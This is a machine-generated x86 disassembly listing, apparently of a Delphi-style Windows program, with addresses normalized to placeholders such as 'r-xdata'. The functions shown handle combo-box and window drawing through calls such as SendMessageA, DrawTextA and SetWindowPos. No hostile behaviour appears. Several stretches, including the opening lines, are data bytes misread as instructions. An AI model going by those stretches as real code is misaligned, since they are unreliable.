inc ebp
outsb
je r-xdata
jb r-xdata
call 0xffffffffe943cb68
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
or al [ ebp ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
or al 0x45
sub_44cc66
inc esp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ esi + ebp * 8 - 0x3697ffbc ] dh
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
rcl [ ebp + eax * 2 + 0x44f0fc00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ edi + ebp * 8 ] dl
inc esp
add [ eax ] bl
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ eax - 0x16 ] dl
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
sub_44d3a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45d584
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_455208
mov edx 0x11
mov eax esi
call sub_45522c
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_44d44c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d5a2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_457d2c
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_425658
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404244
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40423c
push eax
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ ebx + 0x160 ]
call sub_425738
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4247a8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40423c
push eax
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ ebx + 0x160 ]
call sub_425738
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4247a8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40423c
push eax
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ ebx + 0x160 ]
call sub_425738
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d5a9
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_44d5b3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_44d7dc
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_425090
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424f74
xor edx edx
mov eax [ esi + 0x14 ]
call sub_425090
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_425318
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_4033e8
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_4033e8
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_44d6d4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_4257b8
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_4033e8
xor edx edx
mov eax [ edi + 0x160 ]
call sub_4257b8
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_4033e8
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_4527d8
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_44d818
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44d7dc
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44d878
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_4033e8
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44d8a0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_454f1c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_44d904
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d991
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d998
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_455a4c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_46cbe8
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_4033e8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_44da04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44da6a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_45c380
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44da71
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41a1f0
sub_44da7c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_45c380
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_44daa0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_45c380
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_4045c8
mov edx esi
xchg edx eax
call sub_4045c8
mov eax [ esi ]
call sub_40443c
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_45c380
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44daf8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44db5c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_455a4c
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_45c380
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_455a7c
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44db63
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_44db68
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_45c380
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_44db88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40443c
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_45c380
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_44dbb0
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_45c380
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_455f88
sub_44dbe4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_458074
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_455208
mov edx 0x19
mov eax ebx
call sub_45522c
mov dl 0x1
mov eax ebx
call sub_45c5b4
xor edx edx
mov eax ebx
call sub_455c10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_454628
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_44df20
call sub_42237c
mov [ ebx + 0x24c ] eax
push ebx
push sub_44e018
call sub_42237c
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_44dcd8
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_46cb04
mov eax [ esi + 0x24c ]
call sub_46cb04
mov eax [ esi + 0x208 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458198
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_44dd5a
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_45973c
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_44dda4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_45c380
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_44ddc8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_45c380
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_45c380
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_44de10
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_45c380
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_44de3c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_44de88
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_45c380
push eax
call SetWindowTextA
sub_44dec4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44dda4
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_44defc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45b960
pop esi
pop ebx
retn
mov eax ebx
call sub_4598e8
sub_44df20
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_46cc58
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_455590
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406cb0
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_4560f4
jmp r-xdata
sub_44e038
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44e2ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45b19c
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45b284
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44dda4
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_476404
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_4033e8
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cc58
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d388
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45b34c
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44dda4
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44ddc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_44e314
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_4561bc
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_459d5c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45b34c
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_4242e8
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_424f6c
call sub_4242e8
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_424fa8
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_459cc8
test al al
jne r-xdata
mov eax ebx
call sub_44dda4
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_44ddc8
jmp r-xdata
sub_44e422
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_44e580
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e587
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
jmp [ eax * 4 + jump_table_44e450 ]
mov eax edi
mov si 0xffe9
call sub_4033e8
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_4033e8
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_4033e8
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_455a7c
mov eax edi
mov si 0xffeb
call sub_4033e8
mov eax edi
mov si 0xffb2
call sub_4033e8
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_4033e8
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_45aacc
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_45abb8
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_45c380
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_45c380
push eax
call PostMessageA
jmp r-xdata
sub_44e5d4
push esi
push edi
mov esi eax
mov eax esi
call sub_457b08
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_44e5fc
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_44e650
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_4033e8
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_44e67c
push ebx
mov ebx eax
mov eax ebx
call sub_459300
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_45c380
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_44e6b4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_44e74a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e751
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_44e751
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_44e770
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
